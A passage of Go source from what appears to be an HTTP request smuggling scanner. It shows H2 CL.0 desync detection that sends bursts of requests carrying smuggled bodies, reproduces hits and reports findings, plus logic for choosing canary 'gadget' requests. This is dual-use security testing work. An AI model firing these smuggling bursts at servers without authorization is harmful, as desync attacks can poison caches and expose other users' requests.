					method, permName, attempt, probeBodyLen, gadget.responseLen)

				// Reproduce
				reproduced := false
				for r := 0; r < 2; r++ {
					reprProbe, reprErr := h2BurstAttackAndProbe(target, method, path, host, smuggledBody, extra, burstSize, cfg)
					if reprErr == nil && reprProbe.Status != 0 {
						reprLen := len(reprProbe.Body)
						reprDelta := reprLen - gadget.responseLen
						if reprDelta < 0 {
							reprDelta = -reprDelta
						}
						if reprDelta < bDelta/2 {
							reproduced = true
							break
						}
					}
				}
				if reproduced {
					rep.Emit(report.Finding{
						Target:    target.String(),
						Method:    "HTTP/2",
						Severity:  report.SeverityProbable,
						Type:      "H2.CL0",
						Technique: fmt.Sprintf("H2.CL0/%s/%s", method, permName),
						Description: fmt.Sprintf(
							"H2 CL.0 desync (body-size): probe body size %d bytes matches gadget "+
								"expected %d bytes (baseline would be different) after %d attempts "+
								"(%d attacks per burst, technique=%s, method=%s).",
							probeBodyLen, gadget.responseLen, attempt, burstSize, permName, method),
						Evidence: fmt.Sprintf("attempt=%d burst=%d probe_body_len=%d gadget_body_len=%d reproduced=true",
							attempt, burstSize, probeBodyLen, gadget.responseLen),
						RawProbe: fmt.Sprintf("[streams 1-%d] %s\n[stream %d] GET %s HTTP/2\r\n:authority: %s\r\n",
							burstSize*2-1, formatH2AttackRaw(method, path, host, extra, smuggledBody),
							burstSize*2+1, path, host),
					})
					return true
				}
			}
		}
	}
	return false
}

// selectCL0Gadget fires each gadget request directly to find one whose
// response is distinctive and not already present in baseline responses.
//
// Selection strategy (in priority order):
//   1. Marker match: the gadget's marker string appears in its response but NOT
//      in the baseline response. Enables both Detection 1 (gadget bleed) and
//      Detection 2 (status divergence).
//   2. Status divergence: the gadget's response status is in a different HTTP
//      class (e.g. 2xx vs 4xx) from the baseline. Enables Detection 2 only.
//      This covers cases like canary returning 200 when baseline is 404.
//
// The canary path (cfg.CanaryPath) is prepended as a high-priority dynamic
// gadget: many servers echo the requested path in 404 error pages, making
// the canary string a reliable and unique marker.
func selectCL0Gadget(target *url.URL, baseReq []byte, cfg config.Config, rep *report.Reporter) *cl0Gadget {
	host := target.Hostname()
	if p := target.Port(); p != "" {
		host = host + ":" + p
	}

	// Build the dynamic canary gadget. The marker is the path without the leading "/"
	// so it matches "smuggled-canary-xzyw" even when surrounded by other characters
	// (e.g. in "<a href="/smuggled-canary-xzyw">Not Found</a>").
	canaryPath := cfg.CanaryPath
	if canaryPath == "" {
		canaryPath = "/smuggled-canary-xzyw"
	}
	canaryMarker := strings.TrimPrefix(canaryPath, "/")
	canaryGadget := cl0Gadget{
		payload:    "GET " + canaryPath + " HTTP/1.1",
		lookFor:    canaryMarker,
		headerOnly: false,
	}

	// Candidates: canary gadget first (most distinctive), then static list.
	candidates := append([]cl0Gadget{canaryGadget}, clGadgets...)

	baseResp, _, _, _ := request.RawRequest(target, baseReq, cfg)
	baseStatus := request.StatusCode(baseResp)
	baseBodyLen := request.BodyLength(baseResp)

	// Track best status-divergence-only candidate (fallback when no marker matches).
	var statusCandidate *cl0Gadget
	// Track best body-size-divergence candidate (third fallback).
	var sizeCandidate *cl0Gadget

	for i := range candidates {
		g := &candidates[i]
		basePath := target.RequestURI()
		if basePath == "" {
			basePath = "/"
		}
		if strings.Contains(g.payload, basePath+" ") && basePath != "/" {
			continue
		}
		gadgetReq := request.BuildGETRequest(g.payload, host)
		resp, _, timedOut, err := request.RawRequest(target, gadgetReq, cfg)
		if err != nil || timedOut || len(resp) == 0 {
			continue
		}

		gadgetStatus := request.StatusCode(resp)
		gadgetBodyLen := request.BodyLength(resp)

		// Track status-divergence candidate: gadget returns a different HTTP
		// class from baseline (e.g. 200 vs 404). Even without marker matching,
		// Detection 2 can use the status to confirm smuggling.
		if statusCandidate == nil && gadgetStatus > 0 && baseStatus > 0 &&
			gadgetStatus/100 != baseStatus/100 {
			g.responseStatus = gadgetStatus
			g.responseLen = gadgetBodyLen
			statusCandidate = g
		}

		// Track body-size-divergence candidate: gadget has a significantly
		// different body size from baseline (>50% difference, minimum 100 bytes
		// delta). Useful when both return the same status class but different content.
		if sizeCandidate == nil && gadgetBodyLen > 0 && baseBodyLen > 0 &&
			gadgetStatus > 0 && gadgetStatus == baseStatus {
			delta := gadgetBodyLen - baseBodyLen
			if delta < 0 {
				delta = -delta
			}
			maxLen := gadgetBodyLen
			if baseBodyLen > maxLen {
				maxLen = baseBodyLen
			}
			if delta > 100 && delta*100/maxLen > 50 {
				g.responseStatus = gadgetStatus
				g.responseLen = gadgetBodyLen
				sizeCandidate = g
			}
		}

		if baseResp != nil && request.ContainsStr(baseResp, g.lookFor) {
			continue
		}
		if !gadgetMatches(resp, g) {
			continue
		}
		g.responseStatus = gadgetStatus
		g.responseLen = gadgetBodyLen
		rep.Log("CL.0: selected gadget '%s' (marker=%q status=%d) for %s", g.payload, g.lookFor, g.responseStatus, host)
		return g
	}

	// No marker-matched gadget found. Fall back to status-divergence candidate:
	// the gadget won't enable Detection 1 (marker bleed) but WILL enable
	// Detection 2 (status divergence) since responseStatus is set.
	if statusCandidate != nil {
		rep.Log("CL.0: selected gadget '%s' by status divergence (gadget=%d baseline=%d) for %s",
			statusCandidate.payload, statusCandidate.responseStatus, baseStatus, host)
		return statusCandidate
	}

	// Third fallback: body-size divergence. Same status class but very different
	// response size — indicates a different resource was served.
	if sizeCandidate != nil {
		rep.Log("CL.0: selected gadget '%s' by body-size divergence (gadget=%d bytes baseline=%d bytes) for %s",
			sizeCandidate.payload, sizeCandidate.responseLen, baseBodyLen, host)
		return sizeCandidate
	}
	return nil
}

// gadgetMatches checks whether resp contains the gadget's marker string.
func gadgetMatches(resp []byte, g *cl0Gadget) bool {
	if g.headerOnly {
		end := len(resp)
		for i := 0; i < len(resp)-3; i++ {
			if resp[i] == '\r' && resp[i+1] == '\n' && resp[i+2] == '\r' && resp[i+3] == '\n' {
				end = i
				break
			}
		}
		return request.ContainsStr(resp[:end], g.lookFor)
	}
	return request.ContainsStr(resp, g.lookFor)
}
